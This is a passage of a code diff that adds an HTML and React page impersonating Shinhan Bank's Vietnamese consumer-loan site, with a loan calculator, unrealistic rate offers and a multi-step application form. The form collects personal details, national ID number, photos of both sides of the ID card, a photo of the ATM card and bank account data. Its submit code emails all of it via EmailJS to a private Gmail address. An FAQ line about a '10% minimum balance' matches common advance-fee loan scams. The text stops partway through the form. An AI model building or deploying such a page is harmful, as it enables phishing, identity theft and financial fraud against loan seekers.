@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vay tiêu dùng tín chấp | Shinhan Bank</title>
+    <meta name="description" content="Vay tiêu dùng, vay mua nhà, vay mua xe với lãi suất từ 1.9%/năm, hạn mức đến 600 triệu đồng. Đăng ký online nhanh chóng.">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="Vay tiêu dùng tín chấp | Shinhan Bank">
+    <meta property="og:description" content="Vay tiêu dùng, vay mua nhà, vay mua xe với lãi suất từ 1.9%/năm, hạn mức đến 600 triệu đồng. Đăng ký online nhanh chóng.">
+    <meta property="og:image" content="/public/images/logo.png">
+    <meta property="og:type" content="article">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" type="image/x-icon" href="/public/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/public/favicon-180x180.png">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- React CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.production.min.js"></script>
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+    <!-- Compressor.js -->
+    <script src="https://cdn.jsdelivr.net/npm/compressorjs@1.2.1/dist/compressor.min.js"></script>
+    <!-- EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.0.3/dist/email.min.js"></script>
+    <!-- html2pdf.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.9.2/html2pdf.bundle.min.js"></script>
+    <!-- Font Awesome -->
+    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
+
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #f5f8fa;
+            color: #000;
+            min-height: 100vh;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: #fff;
+            border-radius: 10px;
+            padding: 20px;
+            max-width: 800px;
+            width: 90%;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+        .modal-content-lg {
+            max-width: 1200px;
+        }
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        /* Loan Calculator Styles */
+        #loanForm {
+            background-color: #e6f0fa;
+            padding: 20px;
+            border-radius: 8px;
+        }
+        #loanForm label {
+            display: block;
+            margin: 10px 0 5px;
+            color: #004b8d;
+        }
+        #loanForm input, #loanForm select {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        #loanForm button {
+            width: 100%;
+            padding: 12px;
+            background-color: #f28c38;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        #loanForm button:hover {
+            background-color: #d97a30;
+        }
+        #result {
+            margin-top: 20px;
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background-color: white;
+        }
+        #result table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        #result th, #result td {
+            border: 1px solid #ddd;
+            padding: 10px;
+            text-align: right;
+        }
+        #result th {
+            background-color: #004b8d;
+            color: white;
+        }
+        #result td {
+            background-color: #f9f9f9;
+        }
+        .suggestion {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #e6f0fa;
+            border-radius: 4px;
+        }
+        .suggestion h4 {
+            color: #004b8d;
+            margin-bottom: 10px;
+        }
+        .suggestion ul {
+            margin: 0;
+            padding-left: 20px;
+        }
+        /* Registration Form Styles */
+        .modal-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #005BAC;
+            text-align: center;
+            text-transform: uppercase;
+        }
+        .progress-bar {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .progress-step {
+            flex: 1;
+            text-align: center;
+            padding: 10px;
+            background: #f4f4f4;
+            border-radius: 5px;
+            font-size: 14px;
+            color: #333;
+            transition: all 0.3s ease;
+            min-width: 100px;
+        }
+        .progress-step.active {
+            background: #005BAC;
+            color: #fff;
+        }
+        .input-container {
+            margin-bottom: 15px;
+            position: relative;
+        }
+        .input-container input, .input-container select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .input-container .error {
+            border-color: #EF4444;
+        }
+        .input-container .error-message {
+            color: #EF4444;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+        .btn-primary {
+            background: linear-gradient(179.28deg, #F37021 0.45%, #F37021 99.21%);
+            color: #fff;
+            padding: 12px 32px;
+            border-radius: 5px;
+            border: none;
+            cursor: pointer;
+        }
+        .btn-primary:hover {
+            background: #005BAC;
+        }
+        .contract-container, .disbursement-container {
+            background: #fff;
+            padding: 20px;
+            border: 2px solid #005BAC;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        .contract-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            border: 1px solid #005BAC;
+        }
+        .contract-table th, .contract-table td {
+            border: 1px solid #005BAC;
+            padding: 8px;
+            text-align: left;
+            font-size: 14px;
+        }
+        .contract-table th {
+            background: #005BAC;
+            color: #fff;
+        }
+        .download-link {
+            color: #F37021;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        .download-link:hover {
+            color: #005BAC;
+        }
+        .photo-preview {
+            width: 100%;
+            max-width: 300px;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            margin-top: 10px;
+        }
+        @media (max-width: 767px) {
+            .modal-content {
+                padding: 10px;
+            }
+            .modal-title {
+                font-size: 20px;
+            }
+            .progress-step {
+                font-size: 12px;
+                padding: 5px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="bg-[#005BAC] text-white p-4">
+        <div class="container mx-auto flex justify-between items-center">
+            <a href="/" class="text-2xl font-bold">Shinhan Bank</a>
+            <ul class="flex space-x-4 items-center">
+                <li><a href="#home" class="hover:underline">Trang chủ</a></li>
+                <li><a href="#loans" class="hover:underline">Khoản vay</a></li>
+                <li><a href="#contact" class="hover:underline">Liên hệ</a></li>
+                <li><button id="loanCalcBtn" class="btn-primary">Tính khoản vay</button></li>
+                <li><button id="registerBtn" class="btn-primary">Đăng ký hồ sơ</button></li>
+                <li>
+                    <select id="language" class="bg-transparent border-none">
+                        <option value="vi">Tiếng Việt</option>
+                        <option value="en">English</option>
+                    </select>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="container mx-auto py-8">
+        <section id="home">
+            <h1 class="text-3xl font-bold text-[#005BAC] mb-4">Vay tiêu dùng tín chấp</h1>
+            <p class="mb-4">Vay tiêu dùng, vay mua nhà, vay mua xe với lãi suất từ 1.9%/năm, hạn mức đến 600 triệu đồng. Đăng ký online nhanh chóng.</p>
+        </section>
+
+        <section id="loans">
+            <h2 class="text-2xl font-bold text-[#005BAC] mb-4">Các gói vay</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div class="bg-white p-4 rounded shadow">
+                    <h3 class="text-xl font-semibold">Vay tiêu dùng</h3>
+                    <p>Lãi suất 5.5%/năm, hạn mức đến 600 triệu đồng.</p>
+                </div>
+                <div class="bg-white p-4 rounded shadow">
+                    <h3 class="text-xl font-semibold">Vay mua nhà</h3>
+                    <p>Lãi suất 4.5%/năm, hạn mức đến 10 tỷ đồng.</p>
+                </div>
+                <div class="bg-white p-4 rounded shadow">
+                    <h3 class="text-xl font-semibold">Vay mua xe</h3>
+                    <p>Lãi suất 7.1%/năm, hạn mức đến 2 tỷ đồng.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="contact">
+            <h2 class="text-2xl font-bold text-[#005BAC] mb-4">Liên hệ</h2>
+            <p>Email: <a href="mailto:shinhanvietnam@shinhan.com">shinhanvietnam@shinhan.com</a></p>
+            <p>Hotline: 1900 1577</p>
+        </section>
+    </main>
+
+    <!-- Loan Calculator Modal -->
+    <div id="loanCalcModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal('loanCalcModal')">×</span>
+            <h2 class="text-2xl font-bold text-[#004b8d] text-center mb-4">Tính Khoản Vay Shinhan Bank</h2>
+            <form id="loanForm">
+                <label for="loanType">Loại khoản vay:</label>
+                <select id="loanType" onchange="updateInterestRate()">
+                    <option value="tinchap">Vay tín chấp</option>
+                    <option value="digital_tinchap">Vay tín chấp số</option>
+                    <option value="thechap_nha">Vay thế chấp mua nhà</option>
+                    <option value="thechap_xe">Vay thế chấp mua xe</option>
+                    <option value="thechap_xe_cu">Vay thế chấp xe đã qua sử dụng</option>
+                    <option value="tai_nha">Vay tái tài trợ nhà</option>
+                    <option value="dam_bao">Vay đảm bảo bán lẻ (SGI)</option>
+                </select>
+                <label for="amount">Số tiền vay (VND):</label>
+                <input type="number" id="amount" min="1000000" required>
+                <label for="term">Thời hạn vay (tháng):</label>
+                <input type="number" id="term" min="12" max="240" required>
+                <label for="interest">Lãi suất (%/năm):</label>
+                <input type="number" id="interest" step="0.1" value="12.5" readonly>
+                <button type="button" onclick="calculateLoan()">Tính toán</button>
+            </form>
+            <div id="result"></div>
+        </div>
+    </div>
+
+    <!-- Registration Modal -->
+    <div id="registerModal" class="modal">
+        <div class="modal-content modal-content-lg">
+            <span class="close-btn" onclick="closeModal('registerModal')">×</span>
+            <div id="register-root"></div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-[#005BAC] text-white p-4 text-center">
+        <p>© 2025 Shinhan Bank. All rights reserved.</p>
+    </footer>
+
+    <!-- AntBuddy Chat Widget -->
+    <script src="https://antbuddy.com/widget.js"></script>
+
+    <!-- Service Worker -->
+    <script>
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('/service-worker.js');
+            });
+        }
+    </script>
+
+    <!-- Loan Calculator Script -->
+    <script>
+        function updateInterestRate() {
+            const loanType = document.getElementById('loanType').value;
+            const interestInput = document.getElementById('interest');
+            if (loanType === 'tinchap') interestInput.value = 12.5;
+            else if (loanType === 'digital_tinchap') interestInput.value = 7.4;
+            else if (loanType === 'thechap_nha') interestInput.value = 7.5;
+            else if (loanType === 'thechap_xe') interestInput.value = 7.8;
+            else if (loanType === 'thechap_xe_cu') interestInput.value = 8.5;
+            else if (loanType === 'tai_nha') interestInput.value = 7.5;
+            else if (loanType === 'dam_bao') interestInput.value = 7.0;
+        }
+
+        function getSuggestions(amount, term) {
+            let suggestions = '<div class="suggestion"><h4>Đề xuất khoản vay:</h4><ul>';
+            if (amount <= 100000000 && term <= 36) {
+                suggestions += '<li><strong>Vay tín chấp số</strong>: Phù hợp với khoản vay nhỏ (tối đa 100 triệu VND). Lãi suất 7.4%/năm, phê duyệt nhanh trong 5 phút, miễn phí đăng ký.</li>';
+            }
+            if (amount <= 900000000 && term <= 60) {
+                suggestions += '<li><strong>Vay tín chấp</strong>: Phù hợp với nhu cầu tiêu dùng cá nhân (tối đa 900 triệu VND). Lãi suất từ 12.5%/năm, không cần tài sản đảm bảo.</li>';
+            }
+            if (amount > 500000000 && term > 60) {
+                suggestions += '<li><strong>Vay thế chấp mua nhà</strong>: Phù hợp với khoản vay lớn (tối đa 80% giá trị nhà). Lãi suất từ 7.5%/năm, kỳ hạn đến 20 năm. Miễn phí thẩm định cho khoản vay trên 2 tỷ VND.</li>';
+                suggestions += '<li><strong>Vay tái tài trợ nhà</strong>: Phù hợp để tái cấu trúc khoản vay nhà (lãi suất từ 7.5%/năm). Kỳ hạn đến 20 năm.</li>';
+            }
+            if (amount <= 2000000000 && term <= 96) {
+                suggestions += '<li><strong>Vay thế chấp mua xe</strong>: Phù hợp mua xe mới (tối đa 80% giá trị xe). Lãi suất từ 7.8%/năm, kỳ hạn đến 8 năm. Giảm 0.1% cho xe hybrid/điện, 0.3% cho xe THACO AUTO.</li>';
+                suggestions += '<li><strong>Vay thế chấp xe đã qua sử dụng</strong>: Phù hợp mua xe cũ (lãi suất từ 8.5%/năm). Kỳ hạn đến 6 năm.</li>';
+            }
+            suggestions += '<li><strong>Vay đảm bảo bán lẻ (SGI)</strong>: Phù hợp với nhu cầu linh hoạt, có tài sản đảm bảo. Lãi suất từ 7.0%/năm, kỳ hạn tùy chỉnh.</li>';
+            suggestions += '</ul></div>';
+            return suggestions;
+        }
+
+        function calculateLoan() {
+            const amount = Math.round(parseFloat(document.getElementById('amount').value));
+            const term = parseInt(document.getElementById('term').value);
+            const interestRate = parseFloat(document.getElementById('interest').value) / 100 / 12;
+            let remainingBalance = amount;
+            let monthlyPrincipal = Math.round(amount / term);
+            let totalInterest = 0;
+            let resultText = '<h3>Kết quả tính toán:</h3>';
+            resultText += '<table><tr><th>Tháng</th><th>Gốc (VND)</th><th>Lãi (VND)</th><th>Tổng (VND)</th></tr>';
+            for (let i = 1; i <= term; i++) {
+                const interest = Math.round(remainingBalance * interestRate);
+                totalInterest += interest;
+                remainingBalance -= monthlyPrincipal;
+                const totalPayment = monthlyPrincipal + interest;
+                resultText += `<tr><td>${i}</td><td>${monthlyPrincipal.toLocaleString('vi-VN')}</td><td>${interest.toLocaleString('vi-VN')}</td><td>${totalPayment.toLocaleString('vi-VN')}</td></tr>`;
+            }
+            resultText += '</table>';
+            resultText += `<p><strong>Số tiền vay:</strong> ${amount.toLocaleString('vi-VN')} VND</p>`;
+            resultText += `<p><strong>Tổng lãi phải trả:</strong> ${totalInterest.toLocaleString('vi-VN')} VND</p>`;
+            resultText += `<p><strong>Tổng gốc + lãi:</strong> ${(amount + totalInterest).toLocaleString('vi-VN')} VND</p>`;
+            resultText += getSuggestions(amount, term);
+            document.getElementById('result').innerHTML = resultText;
+        }
+
+        function openModal(modalId) {
+            document.getElementById(modalId).style.display = 'flex';
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+
+        document.getElementById('loanCalcBtn').addEventListener('click', () => openModal('loanCalcModal'));
+        document.getElementById('registerBtn').addEventListener('click', () => openModal('registerModal'));
+    </script>
+
+    <!-- Registration Script -->
+    <script>
+        // Initialize EmailJS
+        emailjs.init("c-Ms5MjWbitpDBb-E");
+
+        // Loan Packages
+        const loanPackages = [
+            { value: "Vay Mua Xe", label: "Vay Mua Xe", description: "Lãi suất 7.1%/năm, hạn mức lên đến 2 tỷ đồng, thời hạn linh hoạt 12-84 tháng.", interestRate: 0.071 },
+            { value: "Vay Mua Nhà", label: "Vay Mua Nhà", description: "Lãi suất 4.5%/năm, hạn mức lên đến 10 tỷ đồng, thời hạn linh hoạt 12-300 tháng.", interestRate: 0.045 },
+            { value: "Vay Tiêu Dùng", label: "Vay Tiêu Dùng", description: "Lãi suất 5.5%/năm, hạn mức lên đến 600 triệu đồng, thời hạn linh hoạt 12-60 tháng.", interestRate: 0.055 },
+            { value: "Vay Tiêu Dùng Trực Tuyến", label: "Vay Tiêu Dùng Trực Tuyến", description: "Lãi suất 5.5%/năm, hạn mức lên đến 600 triệu đồng, đăng ký 100% online, thời hạn 12-60 tháng.", interestRate: 0.055 },
+            { value: "Vay Thế Chấp Sổ Tiết Kiệm", label: "Vay Thế Chấp Sổ Tiết Kiệm", description: "Lãi suất 1.9%/năm, hạn mức lên đến 90% giá trị sổ, thời hạn linh hoạt 12-120 tháng.", interestRate: 0.019 },
+            { value: "Vay Tiêu Dùng Bảo Lãnh", label: "Vay Tiêu Dùng Bảo Lãnh", description: "Lãi suất 11.5%/năm, hạn mức lên đến 1 tỷ đồng, thời hạn linh hoạt 12-60 tháng.", interestRate: 0.115 },
+            { value: "Vay Trả Nợ Thế Chấp", label: "Vay Trả Nợ Thế Chấp", description: "Lãi suất 4.5%/năm, hạn mức linh hoạt theo giá trị tài sản, thời hạn 12-240 tháng.", interestRate: 0.045 },
+            { value: "Vay Mua Xe Đã Qua Sử Dụng", label: "Vay Mua Xe Đã Qua Sử Dụng", description: "Lãi suất 7.9%/năm, hạn mức lên đến 1.5 tỷ đồng, thời hạn linh hoạt 12-72 tháng.", interestRate: 0.079 },
+            { value: "Vay Cho Nợ Xấu", label: "Vay Cho Nợ Xấu", description: "Lãi suất 8.9%/năm, hạn mức lên đến 500 triệu đồng, thời hạn linh hoạt 12-48 tháng.", interestRate: 0.089 },
+            { value: "Vay Vốn Đầu Tư Kinh Doanh", label: "Vay Vốn Đầu Tư Kinh Doanh", description: "Lãi suất 5.9%/năm, hạn mức lên đến 5 tỷ đồng, thời hạn linh hoạt 12-120 tháng.", interestRate: 0.059 },
+            { value: "Vay Bổ Sung Vốn Lưu Động", label: "Vay Bổ Sung Vốn Lưu Động", description: "Lãi suất 4.75%/năm, hạn mức lên đến 3 tỷ đồng, thời hạn linh hoạt 12-60 tháng.", interestRate: 0.0475 }
+        ];
+
+        // FAQ Data
+        const faqData = [
+            { question: "CCCD có cần công chứng không?", answer: "Không, bạn chỉ cần chụp ảnh CCCD rõ nét, không cần công chứng." },
+            { question: "Thời gian duyệt hồ sơ bao lâu?", answer: "Hồ sơ được duyệt trong 24-48 giờ sau khi xác minh." },
+            { question: "Tôi có thể trả nợ trước hạn không?", answer: "Có, nhưng sẽ áp dụng phí trả trước hạn từ 2-6% tùy kỳ." },
+            { question: "Số dư tối thiểu là gì?", answer: "Số dư tối thiểu 10% khoản vay nhằm xác minh năng lực tài chính, không cần chuyển hay đóng phí." }
+        ];
+
+        // Loan Calculator Logic
+        const calculateMonthlyPayment = (amount, term, rate) => {
+            const monthlyRate = rate / 12;
+            return (amount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -term));
+        };
+
+        // Number to Words
+        const numberToWords = (num) => {
+            const units = ['', 'nghìn', 'triệu', 'tỷ'];
+            let result = '';
+            let unitIndex = 0;
+            while (num > 0) {
+                let part = num % 1000;
+                if (part > 0) {
+                    result = `${part} ${units[unitIndex]} ${result}`;
+                }
+                num = Math.floor(num / 1000);
+                unitIndex++;
+            }
+            return result.trim() || 'không';
+        };
+
+        // Registration App Component
+        function RegisterApp() {
+            const [state, setState] = React.useState({
+                step: 1,
+                formData: {
+                    fullName: '', dob: '', gender: '', phone: '', email: '',
+                    permanentAddress: '', temporaryAddress: '',
+                    monthlyIncome: '', occupation: '', referralCode: '',
+                    idNumber: '', idIssueDate: '', idIssuePlace: '',
+                    idPhotoFront: null, idPhotoBack: null, atmPhoto: null,
+                    loanAmount: '', loanTerm: '', loanType: '',
+                    bankAccountNumber: '', bankAccountName: '', bankName: ''
+                },
+                errors: {},
+                monthlyPayment: 0,
+                selectedInterestRate: 0.055,
+                contractId: Math.floor(100000 + Math.random() * 900000),
+                showSuccess: false,
+                showContract: false,
+                error: null
+            });
+
+            const { step, formData, errors, monthlyPayment, selectedInterestRate, contractId, showSuccess, showContract, error } = state;
+
+            // Save Form Data to localStorage
+            React.useEffect(() => {
+                localStorage.setItem('formData', JSON.stringify(formData));
+            }, [formData]);
+
+            // Load Form Data from localStorage
+            React.useEffect(() => {
+                const savedData = JSON.parse(localStorage.getItem('formData')) || {};
+                setState(prev => ({ ...prev, formData: { ...prev.formData, ...savedData } }));
+            }, []);
+
+            // Form Validation
+            const validateStep = (step) => {
+                const newErrors = {};
+                if (step === 1) {
+                    if (!formData.fullName) newErrors.fullName = "Vui lòng nhập họ và tên";
+                    if (!formData.dob) newErrors.dob = "Vui lòng nhập ngày sinh";
+                    if (!formData.gender) newErrors.gender = "Vui lòng chọn giới tính";
+                    if (!/^(03|05|07|08|09|01[2|6|8|9])[0-9]{8}$/.test(formData.phone)) newErrors.phone = "Số điện thoại không hợp lệ";
+                    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) newErrors.email = "Email không hợp lệ";
+                } else if (step === 2) {
+                    if (!formData.permanentAddress) newErrors.permanentAddress = "Vui lòng nhập địa chỉ thường trú";
+                    if (!formData.temporaryAddress) newErrors.temporaryAddress = "Vui lòng nhập địa chỉ tạm trú";
+                } else if (step === 3) {
+                    if (!formData.monthlyIncome || formData.monthlyIncome <= 0) newErrors.monthlyIncome = "Thu nhập hàng tháng phải là số dương";
+                    if (!formData.occupation) newErrors.occupation = "Vui lòng nhập nghề nghiệp";
+                } else if (step === 4) {
+                    if (!/^[a-zA-Z0-9]+$/.test(formData.idNumber)) newErrors.idNumber = "Số CCCD/CMND không hợp lệ";
+                    if (!formData.idIssueDate) newErrors.idIssueDate = "Vui lòng nhập ngày cấp";
+                    if (!formData.idIssuePlace) newErrors.idIssuePlace = "Vui lòng nhập nơi cấp";
+                } else if (step === 5) {
+                    if (!formData.idPhotoFront) newErrors.idPhotoFront = "Vui lòng tải ảnh mặt trước CCCD";
+                } else if (step === 6) {
+                    if (!formData.idPhotoBack) newErrors.idPhotoBack = "Vui lòng tải ảnh mặt sau CCCD";
+                } else if (step === 7) {
+                    if (!formData.atmPhoto) newErrors.atmPhoto = "Vui lòng tải ảnh thẻ ATM";
+                } else if (step === 9) {
+                    if (!formData.loanAmount || formData.loanAmount < 30000000 || formData.loanAmount > 600000000) newErrors.loanAmount = "Số tiền vay từ 30 triệu đến 600 triệu VNĐ";
+                    if (!formData.loanTerm || formData.loanTerm < 12 || formData.loanTerm > 60) newErrors.loanTerm = "Thời hạn vay từ 12 đến 60 tháng";
+                    if (!formData.loanType) newErrors.loanType = "Vui lòng chọn loại vay";
+                    if (!formData.bankAccountNumber) newErrors.bankAccountNumber = "Vui lòng nhập số tài khoản ngân hàng";
+                    if (!formData.bankAccountName) newErrors.bankAccountName = "Vui lòng nhập họ và tên chủ tài khoản";
+                    if (!formData.bankName) newErrors.bankName = "Vui lòng nhập tên ngân hàng";
+                }
+                setState(prev => ({ ...prev, errors: newErrors }));
+                return Object.keys(newErrors).length === 0;
+            };
+
+            // Handle Input Change
+            const handleInputChange = (e) => {
+                const { name, value } = e.target;
+                setState(prev => {
+                    const newFormData = { ...prev.formData, [name]: value };
+                    let newMonthlyPayment = prev.monthlyPayment;
+                    let newInterestRate = prev.selectedInterestRate;
+                    if (name === 'loanType') {
+                        const selectedPackage = loanPackages.find(pkg => pkg.value === value);
+                        newInterestRate = selectedPackage ? selectedPackage.interestRate : 0.055;
+                    }
+                    if (name === 'loanAmount' || name === 'loanTerm' || name === 'loanType') {
+                        const amount = newFormData.loanAmount ? parseInt(newFormData.loanAmount) : 0;
+                        const term = newFormData.loanTerm ? parseInt(newFormData.loanTerm) : 0;
+                        if (amount && term) {
+                            newMonthlyPayment = calculateMonthlyPayment(amount, term, newInterestRate);
+                        }
+                    }
+                    return { ...prev, formData: newFormData, monthlyPayment: newMonthlyPayment, selectedInterestRate: newInterestRate };
+                });
+            };
+
+            // Handle File Upload
+            const handleFileUpload = (e) => {
+                const file = e.target.files[0];
+                if (file && file.size > 5 * 1000000) {
+                    alert("Ảnh không được vượt quá 5MB!");
+                    return;
+                }
+                new Compressor(file, {
+                    quality: 0.6,
+                    success(result) {
+                        setState(prev => ({ ...prev, formData: { ...prev.formData, [e.target.name]: result } }));
+                    },
+                    error(err) {
+                        setState(prev => ({ ...prev, error: "Lỗi nén ảnh, vui lòng thử lại." }));
+                    }
+                });
+            };
+
+            // Next Step
+            const nextStep = (next) => {
+                if (validateStep(step)) {
+                    setState(prev => ({ ...prev, step: next }));
+                }
+            };
+
+            // Previous Step
+            const prevStep = (prev) => setState(prev => ({ ...prev, step: prev }));
+
+            // Submit Form
+            const submitForm = () => {
+                if (validateStep(9)) {
+                    const fileToBase64 = (file) => new Promise((resolve, reject) => {
+                        if (!file) reject(new Error("File không tồn tại"));
+                        const reader = new FileReader();
+                        reader.onload = () => resolve(reader.result);
+                        reader.onerror = () => reject(new Error("Không thể đọc file"));
+                        reader.readAsDataURL(file);
+                    });
+
+                    const promises = [];
+                    if (formData.idPhotoFront) promises.push(fileToBase64(formData.idPhotoFront));
+                    else promises.push(Promise.resolve(''));
+                    if (formData.idPhotoBack) promises.push(fileToBase64(formData.idPhotoBack));
+                    else promises.push(Promise.resolve(''));
+                    if (formData.atmPhoto) promises.push(fileToBase64(formData.atmPhoto));
+                    else promises.push(Promise.resolve(''));
+
+                    Promise.all(promises).then(([idPhotoFront, idPhotoBack, atmPhoto]) => {
+                        emailjs.send("service_ytsr91e", "template_admin_loan", {
+                            fullName: formData.fullName || '',
+                            phone: formData.phone || '',
+                            email: formData.email || '',
+                            monthlyIncome: formData.monthlyIncome || '0',
+                            idNumber: formData.idNumber || '',
+                            loanAmount: formData.loanAmount || '0',
+                            loanTerm: formData.loanTerm || '0',
+                            loanType: formData.loanType || '',
+                            bankAccountNumber: formData.bankAccountNumber || '',
+                            bankAccountName: formData.bankAccountName || '',
+                            bankName: formData.bankName || '',
+                            idPhotoFront: idPhotoFront,
+                            idPhotoBack: idPhotoBack,
+                            atmPhoto: atmPhoto,
+                            to_email: "duyenduyenduyen318@gmail.com"
+                        }).then(() => {
+                            emailjs.send("service_ytsr91e", "template_user_confirm", {
+                                fullName: formData.fullName || '',
+                                email: formData.email || '',
+                                contractId: contractId || '0',
+                                loanAmount: formData.loanAmount || '0',
+                                loanTerm: formData.loanTerm || '0',
+                                loanType: formData.loanType || '',
+                                to_email: formData.email || ''
+                            }).then(() => {
+                                alert("Hồ sơ đã được gửi, vui lòng kiểm tra email!");
+                                setState(prev => ({ ...prev, showSuccess: true }));
+                            });
+                        }).catch((err) => {
+                            setState(prev => ({ ...prev, error: "Lỗi khi gửi hồ sơ, vui lòng thử lại." }));
+                        });
+                    }).catch((err) => {
+                        setState(prev => ({ ...prev, error: "Lỗi xử lý ảnh, vui lòng thử lại." }));
+                    });
+                }
+            };
+
+            // Download Contract
+            const downloadContract = (containerId, filename) => {
+                const element = document.getElementById(containerId);
+                if (element) {
+                    html2pdf().from(element).set({
+                        margin: 1,
+                        filename: filename,
+                        html2canvas: { scale: 2 },
+                        jsPDF: { unit: 'in', format: 'letter', orientation: 'portrait' }
+                    }).save();
+                } else {
+                    setState(prev => ({ ...prev, error: "Lỗi tải PDF, vui lòng thử lại." }));
+                }
+            };
+
+            // UI
+            return React.createElement('div', null,
+                // Error Fallback
+                error && React.createElement('div', { className: 'text-center p-4 text-[#EF4444] bg-white rounded-lg' },
+                    React.createElement('h2', null, 'Lỗi'),
+                    React.createElement('p', null, error),
+                    React.createElement('button', { className: 'btn-primary', onClick: () => window.location.reload() }, 'Tải lại trang')
+                ),
+                // Register Modal
+                !showSuccess && !showContract && !error && React.createElement('div', null,
+                    React.createElement('div', { className: 'modal-title' }, 'Đăng ký vay'),
+                    React.createElement('div', { className: 'progress-bar' },
+                        [
+                            'Thông tin cơ bản', 'Địa chỉ', 'Tài chính', 'Thông tin chứng minh',
+                            'Ảnh CCCD (Mặt trước)', 'Ảnh CCCD (Mặt sau)', 'Ảnh thẻ ATM',
+                            'Xác minh khuôn mặt', 'Thông tin vay'
+                        ].map((label, i) =>
+                            React.createElement('div', { key: i, className: `progress-step ${step === i + 1 ? 'active' : ''}` }, label)
+                        )
+                    ),
+                    React.createElement('form', null,
+                        // Step 1: Basic Personal Info
+                        step === 1 && React.createElement('div', null,
+                            React.createElement('p', { className: 'mb-4' }, React.createElement('strong', null, 'Hướng dẫn:'), ' Điền thông tin cá nhân cơ bản.'),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { name: 'fullName', placeholder: 'Họ và tên (*)', value: formData.fullName, onChange: handleInputChange, className: errors.fullName ? 'error' : '' }),
+                                errors.fullName && React.createElement('div', { className: 'error-message' }, errors.fullName)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { type: 'date', name: 'dob', value: formData.dob, onChange: handleInputChange, className: errors.dob ? 'error' : '' }),
+                                errors.dob && React.createElement('div', { className: 'error-message' }, errors.dob)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('select', { name: 'gender', value: formData.gender, onChange: handleInputChange, className: errors.gender ? 'error' : '' },
+                                    React.createElement('option', { value: '' }, 'Chọn giới tính (*)'),
+                                    React.createElement('option', { value: 'Nam' }, 'Nam'),
+                                    React.createElement('option', { value: 'Nữ' }, 'Nữ'),
+                                    React.createElement('option', { value: 'Khác' }, 'Khác')
+                                ),
+                                errors.gender && React.createElement('div', { className: 'error-message' }, errors.gender)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { name: 'phone', placeholder: 'Số điện thoại (*)', value: formData.phone, onChange: handleInputChange, className: errors.phone ? 'error' : '' }),
+                                errors.phone && React.createElement('div', { className: 'error-message' }, errors.phone)
+                            ),
+                            React.createElement('div', { className: 'input-container' },
+                                React.createElement('input', { name: 'email', placeholder: 'Email (*)', value: formData.email, onChange: handleInputChange, className: errors.email ? 'error' : '' }),
+                                errors.email && React.createElement('div', { className: 'error-message' }, errors.email)
+                            ),
+                            React.createElement('div', { className: 'flex justify-end mt-4' },
+                                React.createElement('button', { type: 'button', className: 'btn-primary', onClick: () => nextStep(2) }, 'Tiếp theo')
+                            )
+                        ),
+                        // Step 2: Address Info
+                        step === 2 && React.createElement('div', null,
+                            React.createElement('p', { className: 'mb-4' }, React.createElement('strong', null, 'Hướng dẫn:'), ' Cung cấp thông tin địa chỉ.'),
